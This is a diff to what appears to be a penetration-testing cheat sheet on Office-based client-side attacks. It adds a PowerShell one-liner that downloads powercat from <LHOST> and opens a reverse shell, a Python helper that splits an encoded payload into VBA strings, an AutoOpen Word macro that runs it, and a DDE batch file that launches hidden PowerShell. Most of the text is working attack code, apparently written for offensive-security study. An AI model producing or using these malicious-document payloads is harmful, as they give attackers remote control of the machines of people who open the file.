@@ -2928,14 +2928,16 @@ In evil.hta, the code will find the following command ::> `powershell.exe -nop -
 
 **Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.
 
-1. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
+1. `echo "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell" | base64`
+2. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
    ```python
-   str = "powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa2+bSBT9nEj5D6iyBCjE..."
+   import sys
+   str = "powershell.exe -nop -w hidden -e " + sys.argv[1]
    n = 50
    for i in range(0, len(str), n):
    	print ("Str = Str + " + '"' + str[i:i+n] + '"')
    ```
-2. This will be the final result:
+3. This will be the final result:
    ```VBA
    Sub AutoOpen()
    	MyMacro
@@ -2963,12 +2965,14 @@ In evil.hta, the code will find the following command ::> `powershell.exe -nop -
    	CreateObject("Wscript.Shell").Run Str
    End Sub
    ```
+4. Open the document in Word, go in `View` > `Macros` and create a macro with the code generated in the previous step
+   - Select the current document in `Macros in:`
 
 **Object Linking and Embedding**: another option is to abuse Dynamic Data Exchange (DDE) to execute arbitrary applications from within Office documents ([patched since December of 2017](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021))
 
 1. Create a batch script to run a reverse shell
    ```batch
-   START powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa2+bSBT9nEj5D6iyBCjE...
+   START powershell.exe -nop -w hidden -e <BASE64>
    ```
 2. Open Microsoft Word > Create a new document > Navigate to the Insert ribbon > Click the Object menu
 3. Choose "Create from File" tab and select the newly-created batch script
